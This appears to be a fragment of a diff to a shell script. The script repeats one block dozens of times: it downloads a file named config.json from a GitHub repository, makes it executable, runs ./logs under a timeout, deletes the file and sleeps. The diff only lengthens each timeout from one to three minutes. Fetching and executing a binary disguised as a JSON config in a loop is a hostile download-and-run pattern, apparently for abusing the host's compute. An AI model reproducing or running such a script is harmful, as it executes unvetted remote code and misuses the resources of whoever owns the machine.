 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2158,7 +2158,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2170,7 +2170,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2182,7 +2182,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2194,7 +2194,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2206,7 +2206,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2218,7 +2218,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2230,7 +2230,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2242,7 +2242,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2254,7 +2254,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2266,7 +2266,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2278,7 +2278,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2290,7 +2290,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2302,7 +2302,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2314,7 +2314,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2326,7 +2326,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2338,7 +2338,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2350,7 +2350,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2362,7 +2362,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2374,7 +2374,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2386,7 +2386,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2398,7 +2398,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2410,7 +2410,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2422,7 +2422,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2434,7 +2434,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2446,7 +2446,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2458,7 +2458,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2470,7 +2470,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2482,7 +2482,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2494,7 +2494,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2506,7 +2506,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2518,7 +2518,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2530,7 +2530,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2542,7 +2542,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2554,7 +2554,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2566,7 +2566,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2578,7 +2578,7 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
@@ -2590,6 +2590,6 @@ timeout 2m ./logs
 rm -rf config.json
 sleep 2
 wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
-timeout 1m ./logs
+timeout 3m ./logs
 rm -rf config.json
 sleep 2
